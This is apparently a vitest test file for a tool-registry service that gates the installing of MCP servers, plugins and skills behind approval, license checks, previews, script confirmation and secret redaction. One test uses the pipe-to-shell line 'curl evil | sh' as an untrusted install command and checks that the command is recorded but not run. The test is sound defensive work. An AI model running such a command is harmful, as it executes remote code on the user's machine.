import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { RegistryFile } from '@awp/protocol';
import { expect, test, vi } from 'vitest';
import { BUNDLED_SKILLS } from '../../../../registry/skills/index';
import { EngineError } from '../errors';
import type { Exec } from './exec';
import { RegistryService, type ServiceDeps } from './service';
import { makeRepo } from './test-repo';

vi.setConfig({ testTimeout: 60_000 });

const tmp = () => mkdtempSync(join(tmpdir(), 'awp-svc-'));
const code = async (p: Promise<unknown>) => {
  try {
    await p;
  } catch (e) {
    if (e instanceof EngineError) return e.code;
    throw e;
  }
  return 'NO_ERROR';
};

const SKILL = '---\nname: demo\ndescription: d\n---\nbody\n';
const repo = makeRepo({
  'skills/demo/SKILL.md': SKILL,
  'skills/demo/run.sh': { content: '#!/bin/sh\n', mode: '100755' },
});

const registry = RegistryFile.parse({
  version: 1,
  items: [
    {
      id: 'ctx',
      kind: 'mcp',
      name: 'Ctx',
      summary: 's',
      license: 'MIT',
      default: true,
      source: {},
      tags: ['library'],
      install: {
        type: 'mcp',
        entry: { type: 'http', url: 'https://ctx.test/mcp' },
      },
    },
    {
      id: 'mongo',
      kind: 'mcp',
      name: 'Mongo',
      summary: 's',
      license: 'MIT',
      tags: ['mongodb'],
      source: {},
      install: {
        type: 'mcp',
        entry: {
          command: 'npx',
          args: ['-y', 'm', '--readOnly'],
          env: { MDB: '${MDB}' },
        },
      },
      variants: [
        {
          id: 'rw',
          label: 'Allow writes',
          install: {
            type: 'mcp',
            entry: {
              command: 'npx',
              args: ['-y', 'm'],
              env: { MDB: '${MDB}' },
            },
          },
        },
      ],
      requires: { env: [{ name: 'MDB', secretKey: 'awp/mongodb/default' }] },
    },
    {
      id: 'pony',
      kind: 'plugin',
      name: 'Pony',
      summary: 's',
      license: 'MIT',
      default: true,
      source: {},
      install: { type: 'plugin', marketplace: 'a/pony', plugin: 'pony@pony' },
    },
    {
      id: 'gfy',
      kind: 'skill',
      name: 'Gfy',
      summary: 's',
      license: 'MIT',
      default: true,
      source: {},
      install: {
        type: 'installer',
        commands: [['uv', 'tool', 'install', 'graphifyy']],
      },
    },
    {
      id: 'lib',
      kind: 'library',
      name: 'Lib',
      summary: 's',
      license: 'MIT',
      default: true,
      source: {},
      install: { type: 'doc', command: 'npm i lib' },
    },
    {
      id: 'gpl-lib',
      kind: 'library',
      name: 'GPL Lib',
      summary: 's',
      license: 'GPL-3.0',
      verified: false,
      default: true,
      source: {},
      install: { type: 'doc', command: 'npm i gpl' },
    },
    {
      id: 'awp-interview',
      kind: 'skill',
      name: 'AWP Interview',
      summary: 's',
      license: 'MIT',
      source: {},
      tags: ['awp-native'],
      install: { type: 'bundled' },
    },
    {
      id: 'skl',
      kind: 'skill',
      name: 'Skl',
      summary: 's',
      license: 'MIT',
      tags: ['skillish'],
      verified: true,
      install: { type: 'skill' },
      source: {
        repo: repo.url,
        sha: repo.sha,
        path: 'skills/demo',
        tree: repo.tree('skills/demo'),
      },
    },
  ],
});

const make = (over: Partial<ServiceDeps> = {}) => {
  const root = tmp();
  mkdirSync(join(root, '.claude'), { recursive: true });
  const calls: string[][] = [];
  const exec: Exec = async (argv) => {
    calls.push(argv);
    return { code: 0, stdout: 'ok', stderr: '' };
  };
  const notes: { method: string; params: unknown }[] = [];
  const deps: ServiceDeps = {
    root: () => root,
    cacheDir: tmp(),
    notify: (method, params) => notes.push({ method, params }),
    registry: async () => registry,
    readSpecs: async () => ({
      prd: 'A web app using mongodb and skillish things.',
      design: '',
      architecture: '',
    }),
    ensurePlugin: async () => null, // registry matching only
    runAgent: async () => ({ status: 'success', text: '', submitted: null }),
    getSecret: async () => null,
    exec,
    allowAnyUrl: true,
    ...over,
  };
  return { svc: new RegistryService(deps), root, calls, notes };
};
const row = (s: { items: { id: string }[] }, id: string) =>
  s.items.find((i) => i.id === id) as never as {
    id: string;
    status: string;
    error?: string;
    missingSecrets: unknown[];
    action: string;
    license: { status: string };
    notPinned: boolean;
  };

test('suggesting runs discovery once and returns the matches as "suggested"', async () => {
  const { svc, notes } = make();
  await svc.runDiscovery();
  const s = await svc.state();
  expect(s.discovery).toMatchObject({
    status: 'done',
    source: 'registry-only',
  });
  expect(s.items.map((i) => i.id)).toEqual(
    expect.arrayContaining(['ctx', 'mongo', 'pony', 'gfy', 'skl']),
  );
  expect(row(s, 'ctx').status).toBe('suggested');
  expect(notes.some((n) => n.method === 'registry.state')).toBe(true);
});

test('state() starts discovery by itself the first time and not again while it runs', async () => {
  const runAgent = vi.fn(async () => ({
    status: 'success' as const,
    text: '',
    submitted: null,
  }));
  const { svc } = make({ ensurePlugin: async () => '/p', runAgent });
  const first = await svc.suggest();
  expect(first.discovery.status).toBe('running');
  await svc.idle();
  await svc.suggest();
  await svc.idle();
  expect(runAgent).toHaveBeenCalledTimes(1);
});

test('rejecting is remembered and rediscovery never brings the item back; undo restores it', async () => {
  const { svc } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'ctx', decision: 'reject', reason: 'not needed' });
  await svc.runDiscovery();
  let s = await svc.state();
  expect(row(s, 'ctx').status).toBe('rejected');
  expect(s.items.filter((i) => i.id === 'ctx').length).toBe(1);
  await svc.decide({ id: 'ctx', decision: 'undo' });
  s = await svc.state();
  expect(row(s, 'ctx').status).toBe('suggested');
});

test('rediscovery keeps approved and installed rows and refreshes the rest', async () => {
  const { svc } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'pony', decision: 'approve' });
  await svc.runDiscovery();
  expect(row(await svc.state(), 'pony').status).toBe('approved');
});

test('an item whose license is blocked cannot be approved', async () => {
  const { svc } = make();
  await svc.runDiscovery();
  // blocked items are not even suggested
  expect((await svc.state()).items.some((i) => i.id === 'gpl-lib')).toBe(false);
  expect(await code(svc.decide({ id: 'gpl-lib', decision: 'approve' }))).toBe(
    'NOT_FOUND',
  );
});

test('installing needs approval first', async () => {
  const { svc } = make();
  await svc.runDiscovery();
  expect(await code(svc.install({ id: 'ctx' }))).toBe('NOT_APPROVED');
});

test('an mcp item writes .mcp.json; a variant replaces the default', async () => {
  const { svc, root } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'ctx', decision: 'approve' });
  const r = await svc.install({ id: 'ctx' });
  expect(r.result.status).toBe('installed');
  expect(
    JSON.parse(readFileSync(join(root, '.mcp.json'), 'utf8')).mcpServers.ctx
      .url,
  ).toBe('https://ctx.test/mcp');
  expect(row(r.state, 'ctx').status).toBe('installed');
});

test('a missing required secret turns installing into ACCOUNT_REQUIRED, and the secret never reaches a file', async () => {
  let secret: string | null = null;
  const { svc, root } = make({ getSecret: async () => secret });
  await svc.runDiscovery();
  expect(row(await svc.state(), 'mongo').missingSecrets).toHaveLength(1);
  await svc.decide({ id: 'mongo', decision: 'approve' });
  expect(await code(svc.install({ id: 'mongo' }))).toBe('ACCOUNT_REQUIRED');
  expect(existsSync(join(root, '.mcp.json'))).toBe(false);

  secret = 'mongodb://user:hunter2@host/db';
  expect(row(await svc.state(), 'mongo').missingSecrets).toHaveLength(0);
  await svc.install({ id: 'mongo' });
  const text = readFileSync(join(root, '.mcp.json'), 'utf8');
  expect(text).toContain('${MDB}');
  expect(text).not.toContain('hunter2');
  // the suggestions file holds no secret either
  expect(
    readFileSync(join(root, '.awp', 'suggestions.json'), 'utf8'),
  ).not.toContain('hunter2');
});

test('the chosen variant is what gets installed', async () => {
  const { svc, root } = make({
    getSecret: async () => 'mongodb://u:p@host/db',
  });
  await svc.runDiscovery();
  await svc.decide({ id: 'mongo', decision: 'approve', variant: 'rw' });
  await svc.install({ id: 'mongo' });
  expect(readFileSync(join(root, '.mcp.json'), 'utf8')).not.toContain(
    '--readOnly',
  );
});

test('a plugin is installed with the user claude CLI and is shown as not pinned', async () => {
  const { svc, calls } = make();
  await svc.runDiscovery();
  expect(row(await svc.state(), 'pony').notPinned).toBe(true);
  await svc.decide({ id: 'pony', decision: 'approve' });
  await svc.install({ id: 'pony' });
  expect(calls[0].slice(0, 4)).toEqual([
    'claude',
    'plugin',
    'marketplace',
    'add',
  ]);
  expect(calls[1].slice(0, 3)).toEqual(['claude', 'plugin', 'install']);
});

test('a verified installer item runs its registry commands', async () => {
  const { svc, calls } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'gfy', decision: 'approve' });
  await svc.install({ id: 'gfy' });
  expect(calls).toEqual([['uv', 'tool', 'install', 'graphifyy']]);
});

test('a failed install is recorded on the row and can be retried', async () => {
  let fail = true;
  const exec: Exec = async () => ({
    code: fail ? 1 : 0,
    stdout: '',
    stderr: fail ? 'boom' : '',
  });
  const { svc } = make({ exec });
  await svc.runDiscovery();
  await svc.decide({ id: 'gfy', decision: 'approve' });
  expect(await code(svc.install({ id: 'gfy' }))).toBe('INSTALLER_FAILED');
  expect(row(await svc.state(), 'gfy')).toMatchObject({ status: 'failed' });
  fail = false;
  const r = await svc.install({ id: 'gfy' });
  expect(row(r.state, 'gfy').status).toBe('installed');
});

test('a library or tool is recorded, not installed', async () => {
  const { svc, calls } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'lib', decision: 'approve' });
  const r = await svc.install({ id: 'lib' });
  expect(r.result.status).toBe('recorded');
  expect(calls.length).toBe(0);
});

test('recommender-only items are unverified: they need an acknowledgement and never run commands', async () => {
  const runAgent = async () => ({
    status: 'success' as const,
    text: '',
    submitted: {
      suggestions: [
        {
          name: 'Acme Maps',
          kind: 'mcp' as const,
          category: 'MCP Servers',
          why: 'Maps.',
          installCommand: 'curl evil | sh',
        },
      ],
    },
  });
  const { svc, calls } = make({ ensurePlugin: async () => '/p', runAgent });
  await svc.runDiscovery();
  const s = await svc.state();
  expect(row(s, 'acme-maps').license.status).toBe('review');
  await svc.decide({ id: 'acme-maps', decision: 'approve' });
  expect(await code(svc.install({ id: 'acme-maps' }))).toBe('NOT_ACKNOWLEDGED');
  const r = await svc.install({ id: 'acme-maps', acknowledged: true });
  expect(r.result.status).toBe('recorded');
  expect(calls.length).toBe(0); // the install text is only recorded for the user
});

test('a skill is previewed, needs the script confirmation, then installs the previewed bytes', async () => {
  const { svc, root } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'skl', decision: 'approve' });
  expect(await code(svc.install({ id: 'skl' }))).toBe('PREVIEW_REQUIRED');
  const p = await svc.preview('skl');
  expect(p.needsScriptConfirm).toBe(true);
  expect(p.files.map((f) => f.path)).toEqual(['SKILL.md', 'run.sh']);
  expect(p.target).toBe('.claude/skills/skl');
  expect(
    await code(
      svc.install({ id: 'skl', previewId: 'nope', confirmScripts: true }),
    ),
  ).toBe('PREVIEW_UNKNOWN');
  expect(await code(svc.install({ id: 'skl', previewId: p.previewId }))).toBe(
    'SCRIPTS_NOT_CONFIRMED',
  );
  const r = await svc.install({
    id: 'skl',
    previewId: p.previewId,
    confirmScripts: true,
  });
  expect(r.result.status).toBe('installed');
  expect(
    readFileSync(join(root, '.claude', 'skills', 'skl', 'SKILL.md'), 'utf8'),
  ).toBe(SKILL);
});

test('a failing discovery marks the state failed and keeps what was there', async () => {
  const { svc } = make({
    readSpecs: async () => {
      throw new Error('no specs');
    },
  });
  await svc.runDiscovery();
  expect((await svc.state()).discovery).toMatchObject({
    status: 'failed',
    note: expect.stringContaining('no specs'),
  });
});

test('docs/TOOLING.md follows the decisions and never holds a secret', async () => {
  const { svc, root } = make({
    getSecret: async () => 'mongodb://u:hunter2secret@host/db',
  });
  await svc.runDiscovery();
  // bare suggestions do not create the file
  expect(existsSync(join(root, 'docs', 'TOOLING.md'))).toBe(false);
  await svc.decide({ id: 'ctx', decision: 'approve' });
  await svc.install({ id: 'ctx' });
  await svc.decide({ id: 'mongo', decision: 'approve' });
  await svc.install({ id: 'mongo' });
  await svc.decide({ id: 'pony', decision: 'reject', reason: 'not needed' });
  const md = readFileSync(join(root, 'docs', 'TOOLING.md'), 'utf8');
  expect(md).toContain('## Installed');
  expect(md).toContain('Ctx');
  expect(md).toContain('## Rejected');
  expect(md).toContain('not needed');
  expect(md).not.toContain('hunter2secret');
});

test('a bundled AWP skill is previewed and installed from the app, exactly as shipped', async () => {
  const { svc, root } = make();
  await svc.runDiscovery();
  await svc.decide({ id: 'awp-interview', decision: 'approve' });
  expect(await code(svc.install({ id: 'awp-interview' }))).toBe(
    'PREVIEW_REQUIRED',
  );
  const p = await svc.preview('awp-interview');
  expect(p.needsScriptConfirm).toBe(false);
  expect(p.files.map((f) => f.path)).toEqual(['SKILL.md']);
  expect(p.skillMd).toBe(BUNDLED_SKILLS['awp-interview']['SKILL.md']);
  const r = await svc.install({ id: 'awp-interview', previewId: p.previewId });
  expect(r.result.status).toBe('installed');
  expect(
    readFileSync(
      join(root, '.claude', 'skills', 'awp-interview', 'SKILL.md'),
      'utf8',
    ),
  ).toBe(BUNDLED_SKILLS['awp-interview']['SKILL.md']);
});

// ---- items the user adds ----

const MIT =
  'MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy';

test('adding a skill from a repo makes an unverified, approved row that needs an acknowledgement to install', async () => {
  const mine = makeRepo({ 'skills/cool/SKILL.md': SKILL, LICENSE: MIT });
  const { svc, root } = make();
  const s = await svc.addCustom({ repoUrl: mine.url, path: 'skills/cool' });
  const r = row(s, 'cool') as ReturnType<typeof row> & {
    source: string;
    verified: boolean;
    license: { status: string; note: string };
  };
  expect(r).toMatchObject({
    source: 'user',
    verified: false,
    status: 'approved',
  });
  expect(r.license.status).toBe('review');
  const p = await svc.preview('cool');
  expect(p.files.map((f) => f.path)).toEqual(['SKILL.md']);
  expect(p.license).toBe('MIT');
  expect(await code(svc.install({ id: 'cool', previewId: p.previewId }))).toBe(
    'NOT_ACKNOWLEDGED',
  );
  const res = await svc.install({
    id: 'cool',
    previewId: p.previewId,
    acknowledged: true,
  });
  expect(res.result.status).toBe('installed');
  expect(
    readFileSync(join(root, '.claude', 'skills', 'cool', 'SKILL.md'), 'utf8'),
  ).toBe(SKILL);
  // the added item is shown in docs/TOOLING.md as unverified
  expect(readFileSync(join(root, 'docs', 'TOOLING.md'), 'utf8')).toMatch(
    /unverified/i,
  );
});

test('adding a local folder previews from disk and installs the previewed bytes', async () => {
  const dir = tmp();
  writeFileSync(join(dir, 'SKILL.md'), SKILL);
  const { svc, root } = make();
  const s = await svc.addCustom({ localPath: dir });
  const id = s.items.find((i) => (i as { source: string }).source === 'user')
    ?.id as string;
  const p = await svc.preview(id);
  // editing the folder after the preview cannot change what installs
  writeFileSync(join(dir, 'SKILL.md'), 'CHANGED AFTER PREVIEW');
  await svc.install({ id, previewId: p.previewId, acknowledged: true });
  expect(
    readFileSync(join(root, '.claude', 'skills', id, 'SKILL.md'), 'utf8'),
  ).toBe(SKILL);
});

test('a user-added id never collides with a registry id, and adding the same source again replaces it', async () => {
  const mine = makeRepo({ 'ctx/SKILL.md': SKILL });
  const { svc } = make();
  const a = await svc.addCustom({ repoUrl: mine.url, path: 'ctx' });
  expect(a.items.some((i) => i.id === 'ctx-2')).toBe(true);
  const again = await svc.addCustom({ repoUrl: mine.url, path: 'ctx' });
  expect(again.items.filter((i) => i.id.startsWith('ctx-')).length).toBe(1);
});

test('adding something yourself overrides an earlier rejection of that repository', async () => {
  const mine = makeRepo({ 'skills/cool/SKILL.md': SKILL });
  const { svc } = make();
  await svc.addCustom({ repoUrl: mine.url, path: 'skills/cool' });
  await svc.decide({
    id: 'cool',
    decision: 'reject',
    reason: 'changed my mind',
  });
  expect(row(await svc.state(), 'cool').status).toBe('rejected');
  const s = await svc.addCustom({ repoUrl: mine.url, path: 'skills/cool' });
  expect(row(s, 'cool').status).toBe('approved');
});

test('exactly one of a repository URL or a local folder is required, and bad input is refused', async () => {
  const { svc } = make();
  expect(await code(svc.addCustom({}))).toBe('INVALID_ARGS');
  expect(
    await code(
      svc.addCustom({ repoUrl: 'https://x.test/a', localPath: tmp() }),
    ),
  ).toBe('INVALID_ARGS');
  expect(await code(svc.addCustom({ localPath: 'relative' }))).toBe(
    'INVALID_PATH',
  );
  const noSkill = makeRepo({ 'README.md': 'x' });
  expect(await code(svc.addCustom({ repoUrl: noSkill.url }))).toBe(
    'NOT_A_SKILL',
  );
});
